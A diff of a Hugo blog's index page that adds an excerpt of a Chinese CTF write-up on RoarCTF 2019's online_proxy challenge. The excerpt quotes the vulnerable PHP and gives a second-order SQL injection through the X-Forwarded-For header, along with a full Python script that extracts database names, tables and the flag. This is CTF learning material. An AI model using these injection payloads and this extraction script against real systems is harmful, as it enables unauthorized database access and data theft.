@@ -2,7 +2,7 @@
 <html lang="en" dir="auto" data-theme="auto">
 
 <head>
-	<meta name="generator" content="Hugo 0.154.5"><meta charset="utf-8">
+	<meta name="generator" content="Hugo 0.158.0"><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
@@ -76,11 +76,11 @@
 </script><meta property="og:url" content="https://dragonbox.top/">
   <meta property="og:site_name" content="ch4ser の 超元域">
   <meta property="og:title" content="ch4ser の 超元域">
-  <meta property="og:locale" content="en-us">
+  <meta property="og:locale" content="en_us">
   <meta property="og:type" content="website">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ch4ser の 超元域">
-<meta name="twitter:description" content="">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ch4ser の 超元域">
 
 <script type="application/ld+json">
 {
@@ -146,6 +146,34 @@
     </nav>
 </header>
 <main class="main"> 
+
+<article class="post-entry"> 
+<figure class="entry-cover">
+            <img loading="lazy"
+                srcset='https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu_7280d0d844140dc1.png 360w,https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu_cb1881015bb9c1d9.png 480w,https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png 693w'
+                src="https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png"
+                sizes="(min-width: 768px) 720px, 100vw"
+                width="693" height="347"
+                alt="">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">RoarCTF 2019复现
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>web online_proxy 特征: 第一次登录后源代码内容有如下:
+换一个X-Forwarded-For 后会发现currentip是根据xff判别的
+那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了
+$result = query(&#34;select current_ip, last_ip from ip_log where uuid = &#39;&#34;.addslashes($uuid).&#34;&#39;&#34;); if(count($result) &gt; 0) { if($ip !== $result[0][&#39;current_ip&#39;]) { $last_ip = $result[0][&#39;current_ip&#39;]; query(&#34;delete from ip_log where uuid=&#39;&#34;.addslashes($uuid).&#34;&#39;&#34;); } else { $last_ip = $result[0][&#39;last_ip&#39;]; } } query(&#34;insert into ip_log values (&#39;&#34;.addslashes($uuid).&#34;&#39;, &#39;&#34;.addslashes($ip).&#34;&#39;, &#39;$last_ip&#39;);&#34;); die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($last_ip !== &#34;&#34; ? &#34;\nLast Ip: &#34;.$last_ip : &#34;&#34;).&#34; --&gt;&#34;); 解法:
+先用1&#39;|1|&#39;1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜……在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到
+成功执行了.
+搬运赵师傅的脚本学习学习
+#!/usr/bin/env python3 import requests target = &#34;http://localhost:8302/&#34; def execute_sql(sql): print(&#34;[*]请求语句：&#34; &#43; sql) return_result = &#34;&#34; payload = &#34;0&#39;|length((&#34; &#43; sql &#43; &#34;))|&#39;0&#34; session = requests.session() r = session.get(target, headers={&#39;X-Forwarded-For&#39;: payload}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) start_pos = r.text.find(&#34;Last Ip: &#34;) end_pos = r.text.find(&#34; --&gt;&#34;, start_pos) length = int(r.text[start_pos &#43; 9: end_pos]) print(&#34;[&#43;]长度：&#34; &#43; str(length)) for i in range(1, length &#43; 1, 5): payload = &#34;0&#39;|conv(hex(substr((&#34; &#43; sql &#43; &#34;),&#34; &#43; str(i) &#43; &#34;,5)),16,10)|&#39;0&#34; r = session.get(target, headers={&#39;X-Forwarded-For&#39;: payload}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) start_pos = r.text.find(&#34;Last Ip: &#34;) end_pos = r.text.find(&#34; --&gt;&#34;, start_pos) result = int(r.text[start_pos &#43; 9: end_pos]) return_result &#43;= bytes.fromhex(hex(result)[2:]).decode(&#39;utf-8&#39;) print(&#34;[&#43;]位置 &#34; &#43; str(i) &#43; &#34; 请求五位成功:&#34; &#43; bytes.fromhex(hex(result)[2:]).decode(&#39;utf-8&#39;)) return return_result # 获取数据库 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&#34;)) # 获取数据库表 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#39;F4l9_D4t4B45e&#39;&#34;)) # 获取数据库表 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &#39;F4l9_D4t4B45e&#39; AND TABLE_NAME = &#39;F4l9_t4b1e&#39; &#34;)) # 获取表中内容 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&#34;)) 5555555
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-10-22 08:32:09 +0000 UTC'>October 22, 2019</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>611 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
+  <a class="entry-link" aria-label="post link to RoarCTF 2019复现" href="https://dragonbox.top/posts/ctf-roarctfwp/"></a>
+</article>
 
 <article class="post-entry"> 
 <figure class="entry-cover">
